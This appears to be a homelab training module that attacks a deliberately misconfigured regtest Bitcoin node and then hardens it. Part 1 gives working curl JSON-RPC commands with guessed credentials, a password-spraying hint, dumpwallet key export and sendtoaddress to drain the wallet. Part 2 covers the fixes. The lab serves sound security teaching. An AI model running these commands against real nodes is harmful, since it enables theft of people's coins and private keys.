---
title: "12 - Secure your sovereign node"
---


# 12 - Secure your sovereign node

| | |
|---|---|
| **Goal** | Find a self-hosted Bitcoin node with an exposed RPC, drain its wallet, then lock the node down the way a sovereign operator must. |
| **Target** | `node` at `10.13.37.60` (a Bitcoin Core node in `regtest`, deliberately mis-configured) |
| **Difficulty** | Beginner to intermediate |
| **Est. time** | 45 to 60 min |
| **Prereqs** | Module 00 (you know the node's IP from the network map) |
| **Start from** | The `node` container running its default weak config. Reset: `docker rm -f node && ./builder/60-node.sh` (or the run-command in the builder). |

This is the module that gives the lab its name. Your node is the root of your monetary sovereignty: it decides what is true for your wallet, and if it holds keys, it holds your money. An exposed node is not an abstract risk. A reachable RPC with weak credentials lets anyone read your balances, link your addresses, and, if a wallet is loaded, move your coins. Everything below runs against a throwaway `regtest` node with fake coins, but the lesson is exactly the one that protects a real node.

> Regtest is a private, instant Bitcoin network with no real value. We use it so you can mine, spend and "steal" coins freely. The attacks and the defenses translate directly to mainnet, where the stakes are real.

## MITRE ATT&CK (mapping the idea)

| Tactic | Technique |
|---|---|
| Reconnaissance | Active Scanning (T1595) |
| Credential Access | Brute Force: Password Guessing (T1110.001) |
| Collection | Data from Local System / application (T1005) |
| Impact | (conceptually) financial theft via the wallet |

## Part 1 - Attack: find and drain an exposed node

All commands run from Kali (`10.13.37.10`).

### Step 1 - Discover the node and its open ports
```
nmap -sV -p 22,18443,18444,8332,8333 10.13.37.60
```
What it does: scans the node for SSH and the common Bitcoin RPC/P2P ports (regtest RPC is `18443`, P2P `18444`; mainnet would be `8332`/`8333`).
What you should see: `18443/tcp open` and a service that looks like an HTTP/JSON-RPC endpoint. An RPC port answering from another machine is the whole problem: the RPC interface was never meant to face the network.

### Step 2 - Confirm the RPC is reachable and guess the credentials
```
curl -s --user rpc:rpcpassword \
  --data-binary '{"jsonrpc":"1.0","method":"getblockchaininfo","params":[]}' \
  -H 'content-type: text/plain' http://10.13.37.60:18443/
```
What it does: calls the JSON-RPC API with a weak, guessable username and password. Many self-hosted nodes ship or get set with `rpcuser=rpc` / a dictionary `rpcpassword`.
What you should see: a JSON blob with `"chain":"regtest"` and a block count. You are now talking to someone else's node.

If you did not know the password, you would spray a wordlist. The RPC returns HTTP `401` on a wrong password and `200` on success, so a few lines of a loop over `rockyou` (or hydra with an `http-post` form) recovers a weak one quickly. Because it is a beginner lab the password is `rpcpassword`; on a real node the point is that a weak or reused RPC password is game over.

### Step 3 - Enumerate the wallet
```
RPC='curl -s --user rpc:rpcpassword -H content-type:text/plain http://10.13.37.60:18443/'
# list loaded wallets
$RPC --data-binary '{"method":"listwallets","params":[]}'
# balance and wallet info of the loaded wallet
curl -s --user rpc:rpcpassword -H content-type:text/plain \
  --data-binary '{"method":"getwalletinfo","params":[]}' http://10.13.37.60:18443/wallet/sovereign
```
What it does: lists the wallets the node has open and reads the balance of the `sovereign` wallet.
What you should see: a non-zero balance (about 50 in regtest). At this point an attacker knows the victim has funds and a hot wallet on a reachable node.

### Step 4 - Take the money (and the keys)
```
# where does the money live
curl -s --user rpc:rpcpassword -H content-type:text/plain \
  --data-binary '{"method":"listunspent","params":[]}' http://10.13.37.60:18443/wallet/sovereign
# export EVERY private key in the wallet (the crown jewels)
curl -s --user rpc:rpcpassword -H content-type:text/plain \
  --data-binary '{"method":"dumpwallet","params":["/tmp/stolen.txt"]}' http://10.13.37.60:18443/wallet/sovereign
# or simply send the funds to an attacker address
curl -s --user rpc:rpcpassword -H content-type:text/plain \
  --data-binary '{"method":"sendtoaddress","params":["<attacker-regtest-address>",40]}' http://10.13.37.60:18443/wallet/sovereign
```
What it does: `listunspent` shows the spendable coins, `dumpwallet` writes every private key to a file on the node (which an attacker with a shell could read), and `sendtoaddress` moves the coins outright.
What you should see: a list of UTXOs, and either a dump file path or a transaction id. On mainnet this is an irreversible theft. **This is the flag: proving that an exposed RPC on a node with a hot wallet equals loss of the coins.**

Evidence to capture: the balance you read, and the txid or the fact that `dumpwallet` succeeded.

## Part 2 - Defense: lock the node down

The fixes are simple, and every one of them would have stopped Part 1 cold. Apply them on the `node` (edit its `bitcoin.conf` / run flags), then re-test.

### Fix 1 - Never expose the RPC to the network
The single most important control. Bind RPC to localhost only:
```
# bitcoin.conf
rpcbind=127.0.0.1
rpcallowip=127.0.0.1
```
Remove any `rpcbind=0.0.0.0` and any broad `rpcallowip=0.0.0.0/0`. If a remote app truly needs the node, put it behind SSH port-forwarding or a VPN, not an open port. Manage the node over SSH, not over an exposed RPC.

### Fix 2 - Use cookie auth or a strong hashed credential
Prefer the auto-generated `.cookie` (default when no `rpcuser`/`rpcpassword` is set) or a hashed `rpcauth=` line generated by Bitcoin Core's `rpcauth.py`, with a long random password. Never a short, dictionary, or reused RPC password. Never commit it anywhere.

### Fix 3 - Firewall the ports
Even with RPC bound to localhost, default-deny inbound and only allow what you actually serve:
```
# allow SSH and the P2P port; drop the rest, including RPC
sudo ufw default deny incoming
sudo ufw allow 22/tcp
sudo ufw allow 8333/tcp   # mainnet P2P; 18444 on regtest
sudo ufw enable
```

### Fix 4 - Encrypt the wallet, and keep spending keys OFF the node
```
# on the node, one time
bitcoin-cli -rpcwallet=sovereign encryptwallet "a-long-passphrase"
```
An encrypted wallet cannot be drained without the passphrase, so `dumpwallet` and `sendtoaddress` fail. But the real answer is bigger than the node: **a networked machine is not where your keys belong.** Use a watch-only wallet on the node and keep the private keys on a **hardware wallet**, with the seed written down and stored **offline**. A seed phrase that ever touches an internet-connected computer should be considered already lost. This is the same lesson as module 09, and it is the heart of self-custody.

### Prove the fix
Re-run Part 1 from Kali after applying Fixes 1 to 3:
```
nmap -p 18443 10.13.37.60          # RPC port now filtered/closed from the network
curl -s --user rpc:rpcpassword --data-binary '{"method":"getblockchaininfo","params":[]}' \
  -H content-type:text/plain http://10.13.37.60:18443/   # connection refused / no route to the RPC
```
What you should see: the RPC is no longer reachable from Kali. With cookie/strong auth, even a reachable RPC rejects the guessed password. With an encrypted wallet, a compromised RPC still cannot move funds. The attack from Part 1 fails at every layer you added.

## The sovereignty point

Running your own node is the first brick of monetary sovereignty: you stop trusting someone else's view of the chain. But a node you cannot secure is a liability, not an asset. Bind the RPC, use cookie auth, firewall the box, encrypt any wallet, and keep the keys offline. Secure your homelab, secure your node, and the sovereignty you were reaching for actually holds.

## Flags / evidence captured
- The node's exposed RPC answered from another machine (Part 1, Step 2).
- The `sovereign` wallet balance and its UTXOs were read remotely (Steps 3 to 4).
- `dumpwallet` or `sendtoaddress` succeeded (the theft), then failed after hardening (Prove the fix).

## Cleanup / reset
```
docker rm -f node && ./builder/60-node.sh    # rebuild the weak node for the next run
```

## Go deeper
Research: walk me through hardening a Bitcoin node's RPC and why cookie auth beats rpcuser/rpcpassword
